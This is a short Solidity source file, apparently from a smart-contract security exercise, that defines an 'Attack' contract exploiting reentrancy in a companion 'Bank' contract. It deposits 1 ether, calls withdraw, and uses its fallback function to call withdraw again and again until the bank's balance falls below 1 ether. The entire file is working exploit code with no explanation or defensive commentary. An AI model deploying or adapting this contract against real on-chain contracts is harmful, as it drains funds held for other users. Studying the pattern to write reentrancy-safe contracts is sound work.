pragma solidity 0.8.17;

import { Bank } from "./Bank.sol";

contract Attack {
    address public immutable bank;
    uint256 beforeBalances;

    constructor(address _bank) {
        bank = _bank;
    }

    function attack() external {
        Bank(bank).deposit{ value: 1 ether }();
        Bank(bank).withdraw();
    }

    fallback() external payable {
        if(address(bank).balance >= 1 ether){
            Bank(bank).withdraw();
        }
    }


}
